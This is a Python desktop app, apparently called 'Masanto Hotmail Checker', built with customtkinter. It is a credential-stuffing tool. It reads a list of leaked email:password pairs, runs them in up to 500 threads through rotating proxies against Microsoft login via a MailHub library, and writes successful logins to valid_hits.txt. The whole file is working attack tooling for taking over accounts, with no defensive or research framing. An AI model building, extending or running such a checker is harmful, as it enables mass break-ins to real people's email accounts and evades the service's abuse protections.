import customtkinter as ctk
from tkinter import filedialog, messagebox, scrolledtext, Text, END, WORD, NORMAL, DISABLED
import threading
import queue
import time
import os
import random
import sys
from concurrent.futures import ThreadPoolExecutor

try:
    from mailhub import MailHub
except ImportError:
    messagebox.showerror("Error", "MailHub library not found. Make sure mailhub.py is in the same directory or your PYTHONPATH.")
    sys.exit(1)
mailhub = MailHub()
write_lock = threading.Lock()

class GhostCheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Masanto Hotmail Checker")
        self.root.geometry("1000x700")
        self.combo_queue = queue.Queue()
        self.results_queue = queue.Queue()
        self.running = False
        self.stop_event = threading.Event()
        self.threads = []
        self.checked = 0
        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.start_time = 0
        self.proxies = []
        self.hits_file = None
        ctk.set_appearance_mode("System")
        ctk.set_default_color_theme("blue")
        self.create_widgets()
        self.process_results_queue()

    def create_widgets(self):
        self.main_frame = ctk.CTkFrame(self.root)
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_columnconfigure(1, weight=1)
        self.main_frame.grid_rowconfigure(1, weight=1)
        self.main_frame.grid_rowconfigure(2, weight=1)
        input_frame = ctk.CTkFrame(self.main_frame)
        input_frame.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
        input_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(input_frame, text="Combo List:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.combo_entry = ctk.CTkEntry(input_frame)
        self.combo_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Browse", width=80, command=self.browse_combo).grid(row=0, column=2, padx=5, pady=5)
        ctk.CTkLabel(input_frame, text="Proxy List (opt):").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.proxy_entry = ctk.CTkEntry(input_frame)
        self.proxy_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Browse", width=80, command=self.browse_proxy).grid(row=1, column=2, padx=5, pady=5)
        ctk.CTkLabel(input_frame, text="Proxy Type:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.proxy_type = ctk.CTkComboBox(input_frame, values=["http"], width=120)
        self.proxy_type.grid(row=2, column=1, padx=5, pady=5, sticky="w")
        self.proxy_type.set("http")
        ctk.CTkLabel(input_frame, text="Threads:").grid(row=3, column=0, padx=5, pady=5, sticky="w")
        self.threads_entry = ctk.CTkEntry(input_frame, width=100)
        self.threads_entry.grid(row=3, column=1, padx=5, pady=5, sticky="w")
        self.threads_entry.insert(0, "50")
        ctk.CTkLabel(input_frame, text="Output Folder:").grid(row=4, column=0, padx=5, pady=5, sticky="w")
        self.output_entry = ctk.CTkEntry(input_frame)
        self.output_entry.insert(0, ".")
        self.output_entry.grid(row=4, column=1, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Browse", width=80, command=self.browse_output).grid(row=4, column=2, padx=5, pady=5)
        control_stats_frame = ctk.CTkFrame(self.main_frame)
        control_stats_frame.grid(row=0, column=1, padx=5, pady=5, sticky="nsew")
        control_stats_frame.grid_rowconfigure(1, weight=1)
        ctk.CTkLabel(control_stats_frame, text="MASANTO CHECKER", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10, 5))
        stats_frame = ctk.CTkFrame(control_stats_frame)
        stats_frame.pack(fill="x", expand=True, padx=5, pady=5)
        stats_frame.grid_columnconfigure((0, 1), weight=1)

        stats_layout = [
            ("Checked:", "checked_value"), ("Hits:", "hits_value"),
            ("Fails:", "fails_value"), ("Errors:", "errors_value"),
            ("CPM:", "cpm_value"), ("Queue:", "queue_value")
        ]
        self.stat_labels = {}
        for i, (text, value_name) in enumerate(stats_layout):
            frame = ctk.CTkFrame(stats_frame)
            frame.grid(row=i//2, column=i%2, padx=5, pady=2, sticky="ew")
            label = ctk.CTkLabel(frame, text=text, width=60, anchor="w")
            label.pack(side="left", padx=(5, 0))
            value_label = ctk.CTkLabel(frame, text="0", font=ctk.CTkFont(weight="bold"), anchor="w")
            value_label.pack(side="left", padx=(0, 5), fill="x", expand=True)
            self.stat_labels[value_name] = value_label

        # Start/Stop Buttons Frame
        button_frame = ctk.CTkFrame(control_stats_frame)
        button_frame.pack(fill="x", padx=20, pady=10, side="bottom")

        self.start_button = ctk.CTkButton(button_frame, text="START CHECKING", fg_color="#2ecc71", hover_color="#27ae60",
                                           font=ctk.CTkFont(size=14, weight="bold"), height=40, command=self.start_checking)
        self.start_button.pack(fill="x", pady=(0,5))

        self.stop_button = ctk.CTkButton(button_frame, text="STOP", fg_color="#e74c3c", hover_color="#c0392b",
                                          font=ctk.CTkFont(size=14, weight="bold"), height=40, command=self.stop_checking, state="disabled")
        self.stop_button.pack(fill="x", pady=(5, 0))


        # --- Results Display Section (Middle Row) ---
        results_outer_frame = ctk.CTkFrame(self.main_frame)
        results_outer_frame.grid(row=1, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")
        results_outer_frame.grid_rowconfigure(1, weight=1)
        results_outer_frame.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(results_outer_frame, text="RESULTS", font=ctk.CTkFont(size=14, weight="bold")).grid(row=0, column=0, pady=(5,0), sticky="n")

        self.results_scroll_frame = ctk.CTkScrollableFrame(results_outer_frame, label_text="")
        self.results_scroll_frame.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")


        # --- Log Output Section (Bottom Row) ---
        log_outer_frame = ctk.CTkFrame(self.main_frame)
        log_outer_frame.grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")
        log_outer_frame.grid_rowconfigure(1, weight=1)
        log_outer_frame.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(log_outer_frame, text="LOG OUTPUT", font=ctk.CTkFont(size=14, weight="bold")).grid(row=0, column=0, pady=(5,0), sticky="n")

        self.log_text = ctk.CTkTextbox(
            log_outer_frame,
            wrap="word",
            font=("Consolas", 10),
            activate_scrollbars=True,
            state="disabled" # Start disabled
        )
        self.log_text.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")

    # --- Browse Functions ---
    def browse_combo(self):
        filepath = filedialog.askopenfilename(title="Select Combo List", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filepath:
            self.combo_entry.delete(0, "end")
            self.combo_entry.insert(0, filepath)

    def browse_proxy(self):
        filepath = filedialog.askopenfilename(title="Select Proxy List", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filepath:
            self.proxy_entry.delete(0, "end")
            self.proxy_entry.insert(0, filepath)

    def browse_output(self):
        folderpath = filedialog.askdirectory(title="Select Output Folder")
        if folderpath:
            self.output_entry.delete(0, "end")
            self.output_entry.insert(0, folderpath)

    # --- GUI Update Functions (Safe for Main Thread) ---
    def safe_log(self, message):
        """Puts a log message into the queue for the main thread."""
        self.results_queue.put(("log", message))

    def add_log_message_gui(self, message):
        """Adds a message to the log Textbox - MUST run in main thread."""
        try:
            self.log_text.configure(state="normal")
            self.log_text.insert("end", message + "\n")
            self.log_text.configure(state="disabled")
            self.log_text.see("end")
        except Exception as e:
            print(f"Error adding log message to GUI: {e}", file=sys.stderr)

    def add_result_card_gui(self, combo, status, color):
        """Adds a result card to the scrollable frame - MUST run in main thread."""
        try:
            card = ctk.CTkFrame(self.results_scroll_frame, border_width=1, border_color="#444")
            card.pack(fill="x", padx=5, pady=2, anchor="n") # anchor n agar hasil baru di atas

            # Status label
            status_label = ctk.CTkLabel(card, text=status, text_color=color, font=ctk.CTkFont(size=12, weight="bold"), width=60, anchor="w") # Lebar disesuaikan
            status_label.pack(side="left", padx=5, pady=5)

            # Combo label
            combo_label = ctk.CTkLabel(card, text=combo, font=("Consolas", 11), anchor="w")
            combo_label.pack(side="left", fill="x", expand=True, padx=5, pady=5)

            # Optional: Scroll to top to see latest results easily
            self.results_scroll_frame._parent_canvas.yview_moveto(0)

        except Exception as e:
             print(f"Error adding result card to GUI: {e}", file=sys.stderr)

    # --- Core Logic ---
    def start_checking(self):
        combo_file = self.combo_entry.get()
        proxy_file = self.proxy_entry.get()
        output_folder = self.output_entry.get()
        threads_str = self.threads_entry.get()
        proxy_type_val = self.proxy_type.get() # Ambil tipe proxy

        # --- Input Validation ---
        if not combo_file or not os.path.isfile(combo_file):
            messagebox.showerror("Error", "Please select a valid combo list file!")
            return
        if proxy_file and not os.path.isfile(proxy_file):
            messagebox.showerror("Error", "Proxy file selected but not found!")
            return
        if not output_folder:
             messagebox.showerror("Error", "Please select an output folder!")
             return
        if not os.path.isdir(output_folder):
             try:
                 os.makedirs(output_folder, exist_ok=True)
                 self.safe_log(f"[INFO] Created output folder: {output_folder}")
             except OSError as e:
                 messagebox.showerror("Error", f"Could not create output folder:\n{output_folder}\nError: {e}")
                 return

        try:
            num_threads = int(threads_str)
            if not 1 <= num_threads <= 500: # Batas thread yang wajar
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid number of threads (1-500)!")
            return

        # --- Load Combos ---
        try:
            with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
                # Validasi format dasar saat memuat
                combos = [line.strip() for line in f if ':' in line.strip()]
            if not combos:
                messagebox.showerror("Error", "No valid combos (email:password) found in the file!")
                return
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read combo file:\n{e}")
            return

        # --- Load Proxies ---
        self.proxies = []
        if proxy_file:
            try:
                with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                    self.proxies = [p.strip() for p in f if p.strip()]
                if not self.proxies:
                   self.safe_log("[WARNING] Proxy file loaded but is empty.")
                else:
                   self.safe_log(f"[INFO] Loaded {len(self.proxies)} proxies.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to read proxy file:\n{e}")
                return
        else:
            self.safe_log("[INFO] Running proxyless.")

        # --- Prepare Output File ---
        hits_filename = os.path.join(output_folder, "valid_hits.txt")
        try:
            self.close_output_files() # Close if open from previous run
            self.hits_file = open(hits_filename, "a", encoding="utf-8")
        except Exception as e:
             messagebox.showerror("Error", f"Failed to open hits file for appending:\n{hits_filename}\nError: {e}")
             return

        # --- Reset State ---
        self.checked = 0
        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.start_time = time.time()
        self.stop_event.clear()
        self.threads = []

        # Clear queues
        while not self.combo_queue.empty():
            try: self.combo_queue.get_nowait()
            except queue.Empty: break
        while not self.results_queue.empty():
            try: self.results_queue.get_nowait()
            except queue.Empty: break

        # Clear GUI Elements
        for widget in self.results_scroll_frame.winfo_children():
            widget.destroy()
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")

        # Add combos to queue
        for combo in combos:
            self.combo_queue.put(combo)

        # --- Update UI & Start Workers ---
        self.running = True
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")
        self.safe_log(f"[INFO] === Starting Check ===")
        self.safe_log(f"[INFO] Threads: {num_threads}, Combos: {self.combo_queue.qsize()}, Proxies: {len(self.proxies)}")

        # Start worker threads
        for i in range(num_threads):
            thread = threading.Thread(target=self.worker, args=(proxy_type_val,), daemon=True)
            self.threads.append(thread)
            thread.start()

        # Keep process_results_queue running (sudah dimulai di init)
        # self.update_stats_display() # Initial update (akan dipanggil oleh process_results_queue)

    def worker(self, proxy_type):
        """Worker thread function."""
        while self.running and not self.stop_event.is_set():
            try:
                combo = self.combo_queue.get(timeout=0.2)
            except queue.Empty:
                if self.running:
                    # Mungkin semua combo sudah habis
                    time.sleep(0.1) # Tunggu sebentar jika ingin menambah combo secara dinamis
                    continue # Cek lagi nanti
                else:
                    break # Berhenti jika tidak running

            if self.stop_event.is_set():
                self.combo_queue.put(combo) # Kembalikan combo jika dihentikan
                break

            try:
                # Validasi format di sini, sebelum memanggil login
                parts = combo.strip().split(":")
                if len(parts) != 2 or not parts[0] or not parts[1]:
                    email, password = combo, "(invalid format)"
                    raise ValueError("Invalid combo format")
                email, password = parts[0], parts[1]

                proxy = None
                if self.proxies:
                    chosen_proxy = random.choice(self.proxies)
                    # SESUAIKAN FORMAT PROXY DENGAN KEBUTUHAN mailhub.loginMICROSOFT
                    # Kode asli Anda menggunakan: {"http": f"http://{proxy_string}"}
                    # Pastikan proxy_type (http, socks4, socks5) digunakan jika perlu
                    if proxy_type == "http": # Hanya contoh, perlu disesuaikan
                       proxy = {"http": f"http://{chosen_proxy}"}
                    # else: Tambahkan logic untuk socks4/socks5 jika didukung
                    #    proxy = {proxy_type: f"{proxy_type}://{chosen_proxy}"}
                    else: # Fallback jika tipe tidak dikenal atau hanya http
                        proxy = {"http": f"http://{chosen_proxy}"}


                # --- Panggil Fungsi Login Inti ---
                try:
                    # Diasumsikan loginMICROSOFT mengembalikan list/tuple, ambil elemen pertama
                    res = mailhub.loginMICROSOFT(email, password, proxy)[0]
                    login_exception = None
                except Exception as login_e:
                    res = "error" # Tandai sebagai error jika pemanggilan gagal
                    login_exception = login_e
                # ---------------------------------

                self.checked += 1 # Tambah checked setelah percobaan login

                # --- Proses Hasil ---
                status = "UNKNOWN"
                color = "gray"
                log_message = f"[?] {combo}"

                if res == "ok":
                    self.hits += 1
                    status = "HIT"
                    color = "#2ecc71" # Green
                    log_message = f"[✓ HIT] {combo}"
                    # Tulis ke file dengan lock
                    if self.hits_file and not self.hits_file.closed:
                        with write_lock:
                            self.hits_file.write(f"{email}:{password}\n")
                            self.hits_file.flush() # Flush secara periodik mungkin lebih baik
                elif res == "error":
                     self.errors += 1
                     status = "ERROR"
                     color = "#e74c3c" # Red
                     log_message = f"[⚠ ERROR] {combo} | {type(login_exception).__name__}: {login_exception}"
                else: # Anggap semua hasil lain sebagai fail (termasuk "nfa", "custom", dll jika ada)
                    self.fails += 1
                    status = "FAIL"
                    color = "#e74c3c" # Red
                    log_message = f"[✗ FAIL] {combo} (Reason: {res})" # Tampilkan alasan jika ada

                # Kirim hasil ke antrian GUI
                self.results_queue.put(("add_card", combo, status, color))
                self.results_queue.put(("log", log_message))

            except ValueError as ve: # Tangani format combo invalid
                 self.errors += 1 # Hitung sebagai error
                 self.checked += 1 # Tetap hitung sebagai checked
                 self.results_queue.put(("add_card", combo, "INVALID", "#f39c12")) # Orange/Yellow
                 self.results_queue.put(("log", f"[!] Invalid Format: {combo}"))
            except Exception as e: # Tangani error tak terduga di dalam worker loop
                self.errors += 1
                self.checked += 1
                current_combo = combo if 'combo' in locals() else "N/A"
                self.results_queue.put(("add_card", current_combo, "ERROR", "#e74c3c"))
                self.results_queue.put(("log", f"[CRITICAL WORKER ERROR] Combo: {current_combo} | {type(e).__name__}: {e}"))
                # Pertimbangkan untuk log traceback jika perlu debugging mendalam
                # import traceback
                # self.results_queue.put(("log", traceback.format_exc()))

            finally:
                self.combo_queue.task_done() # Penting untuk queue management

        self.safe_log(f"[INFO] Worker thread {threading.current_thread().name} finished.")


    def process_results_queue(self):
        """Processes items from the results queue to update the GUI safely."""
        try:
            count = 0
            max_items_per_cycle = 50 # Proses maksimal N item per panggilan untuk menjaga responsivitas GUI
            while count < max_items_per_cycle:
                item = self.results_queue.get_nowait()
                task_type = item[0]

                if task_type == "add_card":
                    _, combo, status, color = item
                    self.add_result_card_gui(combo, status, color)
                elif task_type == "log":
                    _, message = item
                    self.add_log_message_gui(message)

                self.results_queue.task_done()
                count += 1

        except queue.Empty:
            pass # Tidak ada item baru
        except Exception as e:
            print(f"Error processing results queue: {e}", file=sys.stderr)

        # Update stats display regardless of whether items were processed
        self.update_stats_display()

        # Check if checking should continue or stop
        if self.running and self.combo_queue.empty() and all(not t.is_alive() for t in self.threads):
             # Jika running=True TAPI queue kosong DAN semua thread selesai, berarti selesai
             self.safe_log("[INFO] === Checking Complete ===")
             self.stop_checking(finished=True) # Panggil stop dengan flag selesai

        # Reschedule next check
        self.root.after(150, self.process_results_queue) # Cek setiap 150ms

    def update_stats_display(self):
        """Updates the statistics labels in the GUI."""
        if not hasattr(self, 'stat_labels') or not self.root.winfo_exists():
            return # Jangan update jika widget belum siap atau window ditutup

        # Calculate CPM
        cpm = 0
        if self.running and self.checked > 0 and self.start_time > 0:
            elapsed_seconds = max(1, time.time() - self.start_time)
            cpm = int((self.checked / elapsed_seconds) * 60)

        # Data untuk label
        stats_data = {
            "checked_value": self.checked,
            "hits_value": self.hits,
            "fails_value": self.fails,
            "errors_value": self.errors,
            "cpm_value": cpm,
            "queue_value": self.combo_queue.qsize()
        }

        # Update label
        for name, value in stats_data.items():
            if name in self.stat_labels:
                try:
                    self.stat_labels[name].configure(text=str(value))
                except Exception:
                    pass # Abaikan error jika widget sudah dihancurkan

    def stop_checking(self, finished=False):
        """Stops the checking process."""
        if not self.running and not finished: # Jangan lakukan apa-apa jika sudah berhenti
            return

        self.running = False
        self.stop_event.set() # Signal threads to stop
        if not finished:
            self.safe_log("[INFO] === Stop Signal Received ===")
            self.safe_log("[INFO] Waiting for threads to finish current task...")

        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")

        # Kosongkan queue jika dihentikan paksa (opsional)
        # if not finished:
        #    while not self.combo_queue.empty():
        #       try: self.combo_queue.get_nowait()
        #       except queue.Empty: break

        self.close_output_files()
        if not finished:
             self.safe_log("[INFO] === Checking Stopped Manually ===")

    def close_output_files(self):
        """Safely closes the hits file."""
        if self.hits_file and not self.hits_file.closed:
            try:
                self.hits_file.close()
                self.hits_file = None
                self.safe_log("[INFO] Hits file closed.")
            except Exception as e:
                self.safe_log(f"[ERROR] Failed to close hits file: {e}")

    def on_closing(self):
        """Handles window closing event."""
        if self.running:
             if messagebox.askyesno("Exit Confirmation", "Checker is running. Stop and exit?"):
                 self.stop_checking()
                 # Beri waktu sedikit agar stop signal diproses
                 self.root.after(200, self.perform_destroy)
             else:
                 return # Jangan keluar jika user batal
        else:
             self.perform_destroy()

    def perform_destroy(self):
         """Closes files and destroys the root window."""
         self.close_output_files()
         self.root.destroy()


if __name__ == "__main__":
    root = ctk.CTk()
    app = GhostCheckerApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
